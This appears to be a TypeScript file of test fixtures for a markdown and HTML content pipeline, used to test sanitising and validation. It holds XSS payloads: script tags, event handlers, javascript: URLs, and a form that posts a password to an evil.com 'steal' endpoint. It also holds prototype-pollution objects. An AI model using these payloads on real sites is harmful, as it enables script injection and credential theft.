export const SAMPLE_MARKDOWN = `---
title: Test Document
date: 2024-01-01
tags:
  - test
  - sample
---

# Main Heading

This is a paragraph with **bold** and *italic* text.

## Subheading

- List item 1
- List item 2

\`\`\`typescript
const code = "block";
\`\`\`
`;

export const SAMPLE_HTML = `
<div>
  <h1>Title</h1>
  <p>Paragraph with <a href="https://example.com">link</a></p>
  <script>alert('xss')</script>
</div>
`;

export const SAMPLE_JSON_LD = {
  "@context": "https://schema.org",
  "@type": "Article",
  headline: "Test Article",
  author: {
    "@type": "Person",
    name: "Test Author",
  },
};

export const DANGEROUS_HTML_SAMPLES = [
  {
    input: '<script>alert("xss")</script>',
    description: "Script tag injection",
  },
  {
    input: '<img src="x" onerror="alert(1)">',
    description: "Event handler injection",
  },
  {
    input: '<a href="javascript:alert(1)">click</a>',
    description: "JavaScript URL injection",
  },
  {
    input: '<div onclick="malicious()">text</div>',
    description: "Click handler injection",
  },
  {
    input: '<iframe src="https://evil.com"></iframe>',
    description: "Iframe injection",
  },
  {
    input: "<style>body { display: none; }</style>",
    description: "Style tag injection",
  },
  {
    input: '<form action="https://evil.com/steal"><input name="password"></form>',
    description: "Form action hijack",
  },
  {
    input: '<object data="malware.swf"></object>',
    description: "Object embed injection",
  },
];

export const SAFE_HTML_SAMPLES = [
  '<p class="test">Hello <strong>world</strong></p>',
  '<a href="https://example.com" target="_blank" rel="noopener">Link</a>',
  "<ul><li>Item 1</li><li>Item 2</li></ul>",
  "<blockquote>Quote text</blockquote>",
  "<code>const x = 1;</code>",
  '<img src="image.png" alt="Description">',
];

export const SAMPLE_YAML_FRONTMATTER = `---
title: Test Document
description: A test document for validation
date: 2024-01-15
author:
  name: Test Author
  email: test@example.com
tags:
  - documentation
  - testing
  - example
draft: false
---`;

export const INVALID_JSON_SAMPLES = [
  "not json at all",
  "{ missing: quotes }",
  '{"unclosed": "bracket"',
  "undefined",
  "NaN",
];

export const PROTOTYPE_POLLUTION_SAMPLES: Record<string, unknown>[] = [
  { __proto__: { polluted: true } },
  { constructor: { prototype: { polluted: true } } },
  { nested: { __proto__: { polluted: true } } },
  { arr: [{ __proto__: { polluted: true } }] },
];

export const SAMPLE_HEADINGS = [
  { depth: 1, text: "Main Title", expectedSlug: "main-title" },
  { depth: 2, text: "Sub Section", expectedSlug: "sub-section" },
  { depth: 2, text: "Sub Section", expectedSlug: "sub-section-1" }, // Duplicate handling
  { depth: 3, text: "Details Here", expectedSlug: "details-here" },
  { depth: 2, text: "With Special Ch@rs!", expectedSlug: "with-special-chrs" },
];

export const SAMPLE_URLS = {
  valid: [
    "https://example.com",
    "https://example.com/path/to/page",
    "https://example.com/path?query=value",
    "https://example.com/path#anchor",
    "http://localhost:3000",
    "https://sub.domain.example.com",
  ],
  invalid: ["not a url", "ftp://example.com", "javascript:alert(1)", "//example.com", "", "   "],
};

export const SAMPLE_SLUGS = {
  valid: ["hello-world", "my-post", "post-123", "a", "single"],
  invalid: [
    "Hello World", // spaces
    "UPPERCASE", // uppercase
    "with_underscore", // underscore
    "-starts-with-dash",
    "ends-with-dash-",
    "", // empty
  ],
};

export const SAMPLE_PAGINATION = {
  valid: [
    { limit: 10, offset: 0 },
    { limit: 50, offset: 100 },
    { page: 1, perPage: 20 },
    { limit: 0, offset: 0 }, // Edge case: zero limit
  ],
  invalid: [
    { limit: -1, offset: 0 }, // Negative limit
    { limit: 10, offset: -5 }, // Negative offset
    { limit: 10000, offset: 0 }, // Exceeds max
    { page: 0, perPage: 10 }, // Page 0
    { limit: "ten", offset: 0 }, // String instead of number
  ],
};

export const SAMPLE_BASE64 = {
  // "Hello, World!" encoded as base64
  text: "SGVsbG8sIFdvcmxkIQ==",
  decoded: new Uint8Array([72, 101, 108, 108, 111, 44, 32, 87, 111, 114, 108, 100, 33]),
};

export const SAMPLE_FLOAT32_ARRAY = {
  // Simple float array for testing
  values: new Float32Array([1.0, 2.5, Math.PI, -0.5, 0]),
};

export const SAMPLE_XML = {
  needsEscaping: '<div class="test">Hello & goodbye</div>',
  escaped: "&lt;div class=&quot;test&quot;&gt;Hello &amp; goodbye&lt;/div&gt;",
  cdataContent: "Content with ]]> in it",
};

export const SAMPLE_DATES = {
  valid: [
    new Date("2024-01-15T10:30:00Z"),
    "2024-01-15",
    1705318200000, // Unix timestamp
  ],
  invalid: [
    "not a date",
    "32/13/2024", // Invalid date format
    NaN,
  ],
};
